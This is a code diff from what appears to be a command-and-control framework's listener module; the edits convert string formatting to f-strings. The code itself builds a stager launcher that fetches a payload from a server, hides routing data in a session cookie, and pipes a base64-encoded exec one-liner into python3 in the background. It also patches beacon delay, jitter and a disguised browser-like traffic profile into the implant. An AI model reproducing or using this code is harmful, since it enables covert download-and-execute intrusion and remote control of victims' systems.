@@ -131,7 +131,7 @@ class Listener:
                     user_agent = profile.split("|")[1]
 
                 launcherBase += "import urllib.request;\n"
-                launcherBase += "UA='%s';" % (user_agent)
+                launcherBase += f"UA='{user_agent}';"
                 launcherBase += f"server='{host}';t='{stage0}';hop='{listener_name}';"
 
                 # prebuild the request routing packet for the launcher
@@ -148,8 +148,8 @@ class Listener:
                 launcherBase += "req=urllib.request.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (
-                    b64RoutingPacket
+                launcherBase += (
+                    f"req.add_header('Cookie',\"session={b64RoutingPacket}\");\n"
                 )
                 launcherBase += "req.add_header('Hop-Name', hop);\n"
 
@@ -159,7 +159,9 @@ class Listener:
                         headerKey = header.split(":")[0]
                         headerValue = header.split(":")[1]
                         # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
-                        launcherBase += f'req.add_header("{headerKey}","{headerValue}");\n'
+                        launcherBase += (
+                            f'req.add_header("{headerKey}","{headerValue}");\n'
+                        )
 
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
@@ -215,10 +217,7 @@ class Listener:
                     launchEncoded = base64.b64encode(
                         launcherBase.encode("UTF-8")
                     ).decode("UTF-8")
-                    launcher = (
-                        "echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('%s'));\" | python3 &"
-                        % launchEncoded
-                    )
+                    launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
                     return launcher
                 else:
                     return launcherBase
@@ -348,16 +347,16 @@ class Listener:
             code = helpers.strip_python_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("delay=60", "delay=%s" % (delay))
-            code = code.replace("jitter=0.0", "jitter=%s" % (jitter))
+            code = code.replace("delay=60", f"delay={delay}")
+            code = code.replace("jitter=0.0", f"jitter={jitter}")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                'profile = "%s"' % (profile),
+                f'profile = "{profile}"',
             )
 
             code = code.replace(
                 'self.defaultResponse = base64.b64decode("")',
-                "self.defaultResponse = base64.b64decode(%s)" % (b64DefaultResponse),
+                f"self.defaultResponse = base64.b64decode({b64DefaultResponse})",
             )
 
             if obfuscate:
